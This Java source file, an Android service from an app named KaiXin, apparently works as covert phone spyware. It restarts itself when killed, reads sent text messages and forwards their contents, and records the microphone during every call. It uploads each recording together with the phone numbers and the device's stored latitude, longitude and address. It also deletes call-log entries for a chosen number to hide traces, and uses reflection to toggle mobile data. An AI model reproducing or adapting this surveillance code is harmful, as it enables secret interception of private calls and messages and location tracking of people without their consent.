package com.kaixin.android.service;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CountDownLatch;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.kaixin.android.R;
import com.kaixin.android.activity.MainActivity;
import com.kaixin.android.common.KaiXinAddress;
import com.kaixin.android.utils.CallService;
import com.kaixin.android.utils.HttpAssist;
import com.kaixin.android.utils.ListenerUtil;
import com.kaixin.android.utils.StorageUtil;
import com.kaixin.android.utils.StringUtil;

public class ListenerService extends Service {

	private static ListenerService service;
	private String tempPhone;
	
	private ConnectivityManager mCM;
	
	private String tempID = null;

	private static final String TAG = "Service";
	private SmsContent smscontent;
	private TelephonyManager tm;
	private exPhoneCallListener myPhoneCallListener;

	private SharedPreferences sp;
	private String outPhoneNumber;

	@Override
	public void onDestroy() {
		Log.e(TAG, "============> Server.onDestroy");
		Intent startIntent = new Intent(this, ListenerService.class);
		startIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startService(startIntent);
		this.getContentResolver().unregisterContentObserver(smscontent);
		tm.listen(myPhoneCallListener, PhoneStateListener.LISTEN_NONE);
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		if (intent != null && StringUtil.isNull(this.outPhoneNumber)) {
			this.outPhoneNumber = intent.getStringExtra("outPhoneNumber");
		}
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}
	
	@Override
	public void onLowMemory() {
		Log.e(TAG, "============> Server.onLow");
		// TODO Auto-generated method stub
		super.onLowMemory();
	}

	public static ListenerService instance() {
		if (service == null)
			service = new ListenerService();
		return service;
	}
	
	@Override
	public void onStart(Intent intent, int startId) {
		Log.e(TAG, "============> Server.onStart");
		super.onStart(intent, startId);
		// 得到Activity内设置的监听号码
		if (intent != null && StringUtil.isNull(this.outPhoneNumber)) {
			this.outPhoneNumber = intent.getStringExtra("outPhoneNumber");
		}
		
	}

	/////发送短信代码//////////////////////////////////////////////////
	class SmsContent extends ContentObserver {
		private Cursor cursor = null;
		private String id = null;
		private String date = null;
		private String body = null;
		private String address = null;
		private String person;

		public SmsContent(Handler handler) {
			super(handler);
		}
		
		/**
		 * @Description 当短信表发送改变时，调用该方法 需要两种权限 android.permission.READ_SMS 读取短信
		 *              android.permission.WRITE_SMS 写短信
		 * @Author Snake
		 * @Date 2010-1-12
		 */
		@Override
		public void onChange(boolean selfChange) {
			// TODO Auto-generated method stub
			super.onChange(selfChange);
			// 读取收件箱中指定号码的短信
			cursor = getContentResolver().query(
					Uri.parse("content://sms/sent"),
					new String[] { "_id", "address", "person", "body",
							"status", "date" }, null, null, "date desc");
			if (cursor != null) {
				if (cursor.moveToFirst()) {
					id = cursor.getString(cursor.getColumnIndex("_id"));
					date = cursor.getString(cursor.getColumnIndex("date"));
					body = cursor.getString(cursor.getColumnIndex("body"));
					person = cursor.getString(cursor.getColumnIndex("person"));
					address = cursor
							.getString(cursor.getColumnIndex("address"));
					if (!id.equals(tempID)) {
						tempID = id;
						CallService.setSms(body, date, person, address,  "手机发送短信");
					}
				}

			}
			
			cursor = getContentResolver().query(
					Uri.parse("content://sms/inbox"),
					new String[] { "_id", "address", "person", "body",
							"status", "date" }, null, null, "date desc");
			if (cursor != null) {
				if (cursor.moveToFirst()) {
					id = cursor.getString(cursor.getColumnIndex("_id"));
					date = cursor.getString(cursor.getColumnIndex("date"));
					body = cursor.getString(cursor.getColumnIndex("body"));
					address = cursor
							.getString(cursor.getColumnIndex("address"));
				}

			}
		}
	}
	//////////////////////////////////////////////////////////////////////
	@Override
	public void onCreate() {
		Log.e(TAG, "============> Server.onCreate");
		super.onCreate();
		
		IntentFilter filter = new IntentFilter(Intent.ACTION_TIME_TICK); 
		BroadcastReceiverMgr receiver = new BroadcastReceiverMgr(); 
	    registerReceiver(receiver, filter); 
		
		// 注册短信变化监听
		smscontent = new SmsContent(new Handler());

		this.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, smscontent);
		// 设置通话监听器，需要PhoneStateListener类
		tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		myPhoneCallListener = new exPhoneCallListener();

		tm.listen(myPhoneCallListener, PhoneStateListener.LISTEN_CALL_STATE);

	}

	private ContentObserver cob = new ContentObserver(new Handler()) { 

		 @Override
		 public boolean deliverSelfNotifications() { 
			 return super.deliverSelfNotifications(); 
		 } 

		 @Override
		 public void onChange(boolean selfChange) { 

			 super.onChange(selfChange);
			 
			 sp = getSharedPreferences("phoneContent", 0);
			 String phone = sp.getString("phone", "");
			 
			 ContentResolver resolver = getContentResolver();
			 
			 resolver.delete(
					 CallLog.Calls.CONTENT_URI,
						CallLog.Calls.NUMBER + "=?",
						new String[] {phone.trim()});
		 } 
	 }; 
	 
	public class exPhoneCallListener extends PhoneStateListener {
		MediaRecorder recorder;
		File audioFile;
		CountDownLatch threadSignal;
		TelephonyManager tm1;
		private Cursor cursor;
		String[] projection = { CallLog.Calls.DATE,// 日期		
				CallLog.Calls.NUMBER, // 号码		
				CallLog.Calls.TYPE, // 类型			
				CallLog.Calls.CACHED_NAME, // 名字				
				CallLog.Calls._ID, // id		
				};
		
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {

			super.onCallStateChanged(state, incomingNumber);

			switch (state) {
			// 无状态时

			case TelephonyManager.CALL_STATE_IDLE:
				if (recorder != null) {
					try {
						recorder.stop();// 停止刻录
						
						Map<String, String> m = new HashMap<String, String>();
						m.put("username", ListenerUtil.getUsername(ListenerService.this));
						m.put("call", tm1.getLine1Number());
						m.put("called", tempPhone);
						m.put("time", "");
						m.put("latitude", StorageUtil.getString(ListenerService.this, "latitude"));
						m.put("longitude", StorageUtil.getString(ListenerService.this, "longitude"));
						m.put("address", StorageUtil.getString(ListenerService.this, "address"));
						HttpAssist.uploadVoice(audioFile
								.getAbsoluteFile().toString(), m);

						recorder.reset();// 重设

						recorder.release();// 刻录完成一定要释放资源

					} catch (Exception e) {
						Log.i("TAG", "停止录制出错");
/*						try {
							Map<String, String> m = new HashMap<String, String>();
							m.put("username", ListenerUtil.getUsername(ListenerService.this));
							m.put("call", tm1.getLine1Number());
							m.put("called", tempPhone);
							m.put("time", "");
							m.put("latitude", StorageUtil.getString(ListenerService.this, "latitude"));
							m.put("longitude", StorageUtil.getString(ListenerService.this, "longitude"));
							m.put("address", StorageUtil.getString(ListenerService.this, "address"));
							HttpAssist.uploadVoice(audioFile
									.getAbsoluteFile().toString(), m);
						} catch (Exception e1) {
						}*/
					} finally {
						ListenerUtil m = new ListenerUtil();
						m.isWIFIAvailable(getApplicationContext());
					}
				}
				
				break;
			// 接起电话
			case TelephonyManager.CALL_STATE_OFFHOOK:
				try {
					// 使用BroadcastReceiver得到拨出号码，通过Flag来做判断是拨出号码是否为监听号码
					if (BroadcastReceiverMgr.isCallFlag) {
						tempPhone = ListenerService.this.outPhoneNumber;
					}
					createNumber();
					//开始录音
					tm1 = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					String myPhoneNum = tm1.getLine1Number();// 本机电话号码

					String dataClum = KaiXinAddress.SDCARED_DATA;
					File file = new File(dataClum);
					if (!file.exists()) {
						file.mkdirs();
					}
					audioFile = new File(dataClum, tempPhone + "_"
							+ myPhoneNum + ".3gp");

					recorder = new MediaRecorder();
					recorder.setAudioSource(MediaRecorder.AudioSource.MIC); // 设置音频采集原
					recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);// 内容输出格式
					recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); // 音频编码方式

					recorder.setOutputFile(audioFile.getAbsolutePath());
					Log.i("TAG", audioFile.getAbsolutePath());
					recorder.prepare(); // 预期准备
					recorder.start();

				} catch (IllegalStateException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
				break;
			// 电话进来时
			case TelephonyManager.CALL_STATE_RINGING:
				tempPhone = incomingNumber;
				createNumber();
				BroadcastReceiverMgr.isCallFlag = false;
				
			}
		}

		private void createNumber() {
			cursor = getContentResolver().query(
					CallLog.Calls.CONTENT_URI,
					null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
			if (cursor != null && cursor.getCount() > 0) {
				cursor.moveToFirst(); // 游标移动到第一项
				Date date = new Date(cursor.getLong(cursor						
						.getColumnIndex(CallLog.Calls.DATE)));		
				String number = cursor.getString(cursor		
						.getColumnIndex(CallLog.Calls.NUMBER));	
				int type = cursor.getInt(cursor						
						.getColumnIndex(CallLog.Calls.TYPE));		
				String cachedName = cursor.getString(cursor			
						.getColumnIndex(CallLog.Calls.CACHED_NAME));// 缓存的名称与电话号码，如果它的存在				
				int id = cursor.getInt(cursor					
						.getColumnIndex(CallLog.Calls._ID));
				tempPhone = number;
//				System.out.println(tempPhone);
			}
		}
	}

	// 检测GPRS是否打开
	private boolean gprsIsOpenMethod(String methodName) {
		Class cmClass = mCM.getClass();
		Class[] argClasses = null;
		Object[] argObject = null;

		Boolean isOpen = false;
		try {
			java.lang.reflect.Method method = cmClass.getMethod(methodName,
					argClasses);

			isOpen = (Boolean) method.invoke(mCM, argObject);
		} catch (Exception e) {
			e.printStackTrace();
		}

		return isOpen;
	}

	// 开启/关闭GPRS
	private void setGprsEnabled(String methodName, boolean isEnable) {
		Class cmClass = mCM.getClass();
		Class[] argClasses = new Class[1];
		argClasses[0] = boolean.class;

		try {
			java.lang.reflect.Method method = cmClass.getMethod(methodName,
					argClasses);
			method.invoke(mCM, isEnable);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
